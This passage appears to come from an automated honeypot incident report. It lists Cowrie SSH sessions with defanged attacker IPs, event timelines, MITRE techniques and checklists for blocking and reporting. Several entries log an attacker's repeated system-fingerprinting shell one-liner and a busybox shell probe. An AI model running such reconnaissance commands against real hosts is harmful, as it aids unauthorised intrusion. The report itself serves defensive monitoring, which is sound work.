| `2026-08-23 19:00:36` | `cowrie.direct-tcpip.data` |
| `2026-08-23 19:00:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42bf0b0c2292

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 19:00 |
| **Last Seen** | 2026-08-23 19:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:00:52` | `cowrie.session.connect` |
| `2026-08-23 19:00:52` | `cowrie.client.version` |
| `2026-08-23 19:00:52` | `cowrie.client.kex` |
| `2026-08-23 19:00:53` | `cowrie.login.success` |
| `2026-08-23 19:00:54` | `cowrie.session.params` |
| `2026-08-23 19:00:54` | `cowrie.command.input` |
| `2026-08-23 19:00:54` | `cowrie.command.input` |
| `2026-08-23 19:00:54` | `cowrie.command.input` |
| `2026-08-23 19:00:54` | `cowrie.command.input` |
| `2026-08-23 19:00:54` | `cowrie.command.input` |
| `2026-08-23 19:00:54` | `cowrie.command.success` |
| `2026-08-23 19:00:54` | `cowrie.command.input` |
| `2026-08-23 19:00:54` | `cowrie.command.input` |
| `2026-08-23 19:00:54` | `cowrie.command.input` |
| `2026-08-23 19:00:54` | `cowrie.command.input` |
| `2026-08-23 19:00:54` | `cowrie.log.closed` |
| `2026-08-23 19:00:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b6f833daaeb

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 19:02 |
| **Last Seen** | 2026-08-23 19:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:02:52` | `cowrie.session.connect` |
| `2026-08-23 19:02:52` | `cowrie.client.version` |
| `2026-08-23 19:02:52` | `cowrie.client.kex` |
| `2026-08-23 19:02:53` | `cowrie.login.success` |
| `2026-08-23 19:02:54` | `cowrie.session.params` |
| `2026-08-23 19:02:54` | `cowrie.command.input` |
| `2026-08-23 19:02:54` | `cowrie.command.input` |
| `2026-08-23 19:02:54` | `cowrie.command.input` |
| `2026-08-23 19:02:54` | `cowrie.command.input` |
| `2026-08-23 19:02:54` | `cowrie.command.input` |
| `2026-08-23 19:02:54` | `cowrie.command.success` |
| `2026-08-23 19:02:54` | `cowrie.command.input` |
| `2026-08-23 19:02:54` | `cowrie.command.input` |
| `2026-08-23 19:02:54` | `cowrie.command.input` |
| `2026-08-23 19:02:54` | `cowrie.command.input` |
| `2026-08-23 19:02:55` | `cowrie.log.closed` |
| `2026-08-23 19:02:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21ad1c615725

| Field | Detail |
|---|---|
| **Source IP** | `187.93.68[.]178` |
| **First Seen** | 2026-08-23 19:03 |
| **Last Seen** | 2026-08-23 19:03 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:03:08` | `cowrie.session.connect` |
| `2026-08-23 19:03:09` | `cowrie.client.version` |
| `2026-08-23 19:03:09` | `cowrie.client.kex` |
| `2026-08-23 19:03:11` | `cowrie.login.success` |
| `2026-08-23 19:03:12` | `cowrie.direct-tcpip.request` |
| `2026-08-23 19:03:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.93.68[.]178` to AbuseIPDB if not already reported
- [ ] Block `187.93.68[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b023503684a9

| Field | Detail |
|---|---|
| **Source IP** | `122.160.50[.]155` |
| **First Seen** | 2026-08-23 19:03 |
| **Last Seen** | 2026-08-23 19:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:03:17` | `cowrie.session.connect` |
| `2026-08-23 19:03:18` | `cowrie.client.version` |
| `2026-08-23 19:03:18` | `cowrie.client.kex` |
| `2026-08-23 19:03:20` | `cowrie.login.success` |
| `2026-08-23 19:03:21` | `cowrie.direct-tcpip.request` |
| `2026-08-23 19:03:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.160.50[.]155` to AbuseIPDB if not already reported
- [ ] Block `122.160.50[.]155` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95df6ff393a1

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 19:04 |
| **Last Seen** | 2026-08-23 19:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:04:48` | `cowrie.session.connect` |
| `2026-08-23 19:04:48` | `cowrie.client.version` |
| `2026-08-23 19:04:48` | `cowrie.client.kex` |
| `2026-08-23 19:04:49` | `cowrie.login.success` |
| `2026-08-23 19:04:50` | `cowrie.session.params` |
| `2026-08-23 19:04:50` | `cowrie.command.input` |
| `2026-08-23 19:04:50` | `cowrie.command.input` |
| `2026-08-23 19:04:50` | `cowrie.command.input` |
| `2026-08-23 19:04:50` | `cowrie.command.input` |
| `2026-08-23 19:04:50` | `cowrie.command.input` |
| `2026-08-23 19:04:50` | `cowrie.command.success` |
| `2026-08-23 19:04:50` | `cowrie.command.input` |
| `2026-08-23 19:04:50` | `cowrie.command.input` |
| `2026-08-23 19:04:50` | `cowrie.command.input` |
| `2026-08-23 19:04:50` | `cowrie.command.input` |
| `2026-08-23 19:04:51` | `cowrie.log.closed` |
| `2026-08-23 19:04:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfd7ba7add51

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]196` |
| **First Seen** | 2026-08-23 19:05 |
| **Last Seen** | 2026-08-23 19:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:05:12` | `cowrie.session.connect` |
| `2026-08-23 19:05:12` | `cowrie.login.success` |
| `2026-08-23 19:05:13` | `cowrie.session.params` |
| `2026-08-23 19:05:13` | `cowrie.command.input` |
| `2026-08-23 19:05:14` | `cowrie.command.input` |
| `2026-08-23 19:05:14` | `cowrie.command.input` |
| `2026-08-23 19:05:15` | `cowrie.command.input` |
| `2026-08-23 19:05:15` | `cowrie.command.failed` |
| `2026-08-23 19:05:16` | `cowrie.log.closed` |
| `2026-08-23 19:05:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]196` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c20b9476ca43

| Field | Detail |
|---|---|
| **Source IP** | `49.124.147[.]102` |
| **First Seen** | 2026-08-23 19:05 |
| **Last Seen** | 2026-08-23 19:05 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:05:38` | `cowrie.session.connect` |
| `2026-08-23 19:05:39` | `cowrie.client.version` |
| `2026-08-23 19:05:39` | `cowrie.client.kex` |
| `2026-08-23 19:05:41` | `cowrie.login.success` |
| `2026-08-23 19:05:42` | `cowrie.direct-tcpip.request` |
| `2026-08-23 19:05:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.147[.]102` to AbuseIPDB if not already reported
- [ ] Block `49.124.147[.]102` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a5c977f9ab3

| Field | Detail |
|---|---|
| **Source IP** | `182.75.234[.]236` |
| **First Seen** | 2026-08-23 19:05 |
| **Last Seen** | 2026-08-23 19:05 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:05:47` | `cowrie.session.connect` |
| `2026-08-23 19:05:48` | `cowrie.client.version` |
| `2026-08-23 19:05:48` | `cowrie.client.kex` |
| `2026-08-23 19:05:51` | `cowrie.login.success` |
| `2026-08-23 19:05:51` | `cowrie.direct-tcpip.request` |
| `2026-08-23 19:05:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.234[.]236` to AbuseIPDB if not already reported
- [ ] Block `182.75.234[.]236` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdd2e82f1edc

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 19:06 |
| **Last Seen** | 2026-08-23 19:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:06:49` | `cowrie.session.connect` |
| `2026-08-23 19:06:49` | `cowrie.client.version` |
| `2026-08-23 19:06:49` | `cowrie.client.kex` |
| `2026-08-23 19:06:50` | `cowrie.login.success` |
| `2026-08-23 19:06:51` | `cowrie.session.params` |
| `2026-08-23 19:06:51` | `cowrie.command.input` |
| `2026-08-23 19:06:51` | `cowrie.command.input` |
| `2026-08-23 19:06:51` | `cowrie.command.input` |
| `2026-08-23 19:06:51` | `cowrie.command.input` |
| `2026-08-23 19:06:51` | `cowrie.command.input` |
| `2026-08-23 19:06:51` | `cowrie.command.success` |
| `2026-08-23 19:06:51` | `cowrie.command.input` |
| `2026-08-23 19:06:51` | `cowrie.command.input` |
| `2026-08-23 19:06:51` | `cowrie.command.input` |
| `2026-08-23 19:06:51` | `cowrie.command.input` |
| `2026-08-23 19:06:51` | `cowrie.log.closed` |
| `2026-08-23 19:06:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a17a9a3b983

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 19:08 |
| **Last Seen** | 2026-08-23 19:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:08:57` | `cowrie.session.connect` |
| `2026-08-23 19:08:57` | `cowrie.client.version` |
| `2026-08-23 19:08:57` | `cowrie.client.kex` |
| `2026-08-23 19:08:58` | `cowrie.login.success` |
| `2026-08-23 19:08:59` | `cowrie.session.params` |
| `2026-08-23 19:08:59` | `cowrie.command.input` |
| `2026-08-23 19:08:59` | `cowrie.command.input` |
| `2026-08-23 19:08:59` | `cowrie.command.input` |
| `2026-08-23 19:08:59` | `cowrie.command.input` |
| `2026-08-23 19:08:59` | `cowrie.command.input` |
| `2026-08-23 19:08:59` | `cowrie.command.success` |
| `2026-08-23 19:08:59` | `cowrie.command.input` |
| `2026-08-23 19:08:59` | `cowrie.command.input` |
| `2026-08-23 19:08:59` | `cowrie.command.input` |
| `2026-08-23 19:08:59` | `cowrie.command.input` |
| `2026-08-23 19:08:59` | `cowrie.log.closed` |
| `2026-08-23 19:09:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51dc2d55c6ff

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 19:10 |
| **Last Seen** | 2026-08-23 19:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:10:10` | `cowrie.session.connect` |
| `2026-08-23 19:10:10` | `cowrie.client.version` |
| `2026-08-23 19:10:10` | `cowrie.client.kex` |
| `2026-08-23 19:10:11` | `cowrie.login.success` |
| `2026-08-23 19:10:11` | `cowrie.direct-tcpip.request` |
| `2026-08-23 19:10:12` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 19:10:12` | `cowrie.direct-tcpip.data` |
| `2026-08-23 19:10:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56b6329b8efd

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 19:10 |
| **Last Seen** | 2026-08-23 19:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:10:13` | `cowrie.session.connect` |
| `2026-08-23 19:10:13` | `cowrie.client.version` |
| `2026-08-23 19:10:14` | `cowrie.client.kex` |
| `2026-08-23 19:10:14` | `cowrie.login.success` |
| `2026-08-23 19:10:15` | `cowrie.direct-tcpip.request` |
| `2026-08-23 19:10:15` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 19:10:15` | `cowrie.direct-tcpip.data` |
| `2026-08-23 19:10:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-deaa4c8a7bc4

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]50` |
| **First Seen** | 2026-08-23 19:10 |
| **Last Seen** | 2026-08-23 19:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:10:33` | `cowrie.session.connect` |
| `2026-08-23 19:10:33` | `cowrie.client.version` |
| `2026-08-23 19:10:33` | `cowrie.client.kex` |
| `2026-08-23 19:10:36` | `cowrie.login.success` |
| `2026-08-23 19:10:36` | `cowrie.direct-tcpip.request` |
| `2026-08-23 19:10:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]50` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31a3a04ede43

| Field | Detail |
|---|---|
| **Source IP** | `92.251.124[.]73` |
| **First Seen** | 2026-08-23 19:10 |
| **Last Seen** | 2026-08-23 19:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:10:42` | `cowrie.session.connect` |
| `2026-08-23 19:10:42` | `cowrie.client.version` |
| `2026-08-23 19:10:42` | `cowrie.client.kex` |
| `2026-08-23 19:10:43` | `cowrie.login.success` |
| `2026-08-23 19:10:44` | `cowrie.direct-tcpip.request` |
| `2026-08-23 19:10:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.251.124[.]73` to AbuseIPDB if not already reported
- [ ] Block `92.251.124[.]73` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e387baad362

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 19:10 |
| **Last Seen** | 2026-08-23 19:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:10:51` | `cowrie.session.connect` |
| `2026-08-23 19:10:51` | `cowrie.client.version` |
| `2026-08-23 19:10:51` | `cowrie.client.kex` |
| `2026-08-23 19:10:52` | `cowrie.login.success` |
| `2026-08-23 19:10:54` | `cowrie.session.params` |
| `2026-08-23 19:10:54` | `cowrie.command.input` |
| `2026-08-23 19:10:54` | `cowrie.command.input` |
| `2026-08-23 19:10:54` | `cowrie.command.input` |
| `2026-08-23 19:10:54` | `cowrie.command.input` |
| `2026-08-23 19:10:54` | `cowrie.command.input` |
| `2026-08-23 19:10:54` | `cowrie.command.success` |
| `2026-08-23 19:10:54` | `cowrie.command.input` |
| `2026-08-23 19:10:54` | `cowrie.command.input` |
| `2026-08-23 19:10:54` | `cowrie.command.input` |
| `2026-08-23 19:10:54` | `cowrie.command.input` |
| `2026-08-23 19:10:54` | `cowrie.log.closed` |
| `2026-08-23 19:10:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a969f5dc703

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 19:12 |
| **Last Seen** | 2026-08-23 19:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:12:44` | `cowrie.session.connect` |
| `2026-08-23 19:12:44` | `cowrie.client.version` |
| `2026-08-23 19:12:44` | `cowrie.client.kex` |
| `2026-08-23 19:12:45` | `cowrie.login.success` |
| `2026-08-23 19:12:47` | `cowrie.session.params` |
| `2026-08-23 19:12:47` | `cowrie.command.input` |
| `2026-08-23 19:12:47` | `cowrie.command.input` |
| `2026-08-23 19:12:47` | `cowrie.command.input` |
| `2026-08-23 19:12:47` | `cowrie.command.input` |
| `2026-08-23 19:12:47` | `cowrie.command.input` |
| `2026-08-23 19:12:47` | `cowrie.command.success` |
| `2026-08-23 19:12:47` | `cowrie.command.input` |
| `2026-08-23 19:12:47` | `cowrie.command.input` |
| `2026-08-23 19:12:47` | `cowrie.command.input` |
| `2026-08-23 19:12:47` | `cowrie.command.input` |
| `2026-08-23 19:12:47` | `cowrie.log.closed` |
| `2026-08-23 19:12:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eada39eaebe3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 19:14 |
| **Last Seen** | 2026-08-23 19:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
